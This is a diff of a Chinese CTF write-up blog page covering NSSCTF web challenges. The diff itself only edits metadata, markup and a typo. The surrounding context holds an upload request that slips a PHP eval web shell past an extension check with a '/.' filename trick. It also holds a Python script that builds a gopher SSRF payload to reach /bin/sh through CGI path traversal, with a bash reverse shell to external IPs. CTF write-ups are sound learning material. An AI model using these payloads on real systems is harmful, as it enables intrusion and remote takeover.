@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693300087149-8b21e202-2dc4-45b3-87c9-373819daf28d.png">
 <meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693307041761-05276fd0-0b48-4d6a-ac04-e3d5e644a066.png">
 <meta property="article:published_time" content="2023-08-30T05:55:10.000Z">
-<meta property="article:modified_time" content="2023-08-30T05:58:11.332Z">
+<meta property="article:modified_time" content="2023-09-04T12:36:47.757Z">
 <meta property="article:author" content="Z1d10t">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693108794590-ca64554b-c13d-4a28-b22a-be5854ad5ec9.png">
@@ -233,9 +233,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-08-30 13:55:10 / 修改时间：13:58:11" itemprop="dateCreated datePublished" datetime="2023-08-30T13:55:10+08:00">2023-08-30</time>
+      <time title="创建时间：2023-08-30 13:55:10" itemprop="dateCreated datePublished" datetime="2023-08-30T13:55:10+08:00">2023-08-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-04 20:36:47" itemprop="dateModified" datetime="2023-09-04T20:36:47+08:00">2023-09-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -266,8 +272,12 @@
 <p>参考以下文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/7470682764/">https://www.freesion.com/article/7470682764/</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253383">https://www.anquanke.com/post/id/253383</a></p>
+<blockquote>
 <p>在操作系统中，都是禁止使用/作为文件名的，但是不知道为什么后面加一个.就可以成功的写入1.php了。</p>
+</blockquote>
+<blockquote>
 <p>$pathinfo[extension]=pathfo($name,PATHINFO_EXTENSION) 获取文件后缀名时时获取的 . 后面的内容，当出现多个 . 时，结果为最后一个 . 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。</p>
+</blockquote>
 <p> 所以用<code>/.</code>绕过就行 记得要url编码一下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node6.anna.nssctf.cn:<span class="number">28316</span></span><br><span class="line">Content-Length: <span class="number">332</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryznxIJaJoF11xMYcQ</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">116.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryznxIJaJoF11xMYcQ</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php%2F.&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GIF89a</span></span><br><span class="line"><span class="comment">&lt;?php <span class="doctag">@eval</span>($_POST[&#x27;x&#x27;]); ?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryznxIJaJoF11xMYcQ</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">提交</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryznxIJaJoF11xMYcQ--</span></span><br></pre></td></tr></table></figure>
 
@@ -290,7 +300,7 @@
 <p>可以构造这种请求包来rce</p>
 <p>直接用god脚本 不用手动去构造<code>%0D%0A</code> </p>
 <p>还有一个小点是那个<code>_</code> 一定要加不然会将之后数据第一个字符吞了 参考:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1610645">https://cloud.tencent.com/developer/article/1610645</a></p>
-<p>还有一个小点就是我们都找到三个双引号或者单引号在python中是注释符 但是也可以被当作用来括普通字符串的qwq</p>
+<p>还有一个小点就是我们都知道三个双引号或者单引号在python中是注释符 但是也可以被当作用来括普通字符串的qwq</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.<span class="property">parse</span> <span class="keyword">import</span> quote</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: curl/7.68.0</span></span><br><span class="line"><span class="string">Content-Length:59</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo;bash -c &quot;</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">8.130</span><span class="number">.34</span><span class="number">.53</span>/<span class="number">7777</span> &lt;&amp;<span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">#<span class="attr">http</span>:<span class="comment">//node6.anna.nssctf.cn:28949/?url=mybox://127.0.0.1:80/_POST%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520curl/7.68.0%250D%250AContent-Length%253A59%250D%250A%250D%250Aecho%253Bbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/114.116.119.253/7777%2520%253C%25261%2522%250D%250A</span></span><br><span class="line">tmp = <span class="title function_">quote</span>(test)</span><br><span class="line"><span class="keyword">new</span> = tmp.<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line"><span class="title function_">print</span>(<span class="keyword">new</span>)</span><br><span class="line">result=<span class="string">&#x27;_&#x27;</span>+<span class="title function_">quote</span>(<span class="keyword">new</span>)</span><br><span class="line">#post</span><br><span class="line">#result = <span class="string">&#x27;_&#x27;</span>+<span class="keyword">new</span></span><br><span class="line">common=<span class="string">&quot;gopher://127.0.0.1:80/&quot;</span></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">quote</span>(common)+result)</span><br></pre></td></tr></table></figure>
 
 <h1 id="MyJs"><a href="#MyJs" class="headerlink" title="MyJs"></a>MyJs</h1><p>源码如下：</p>
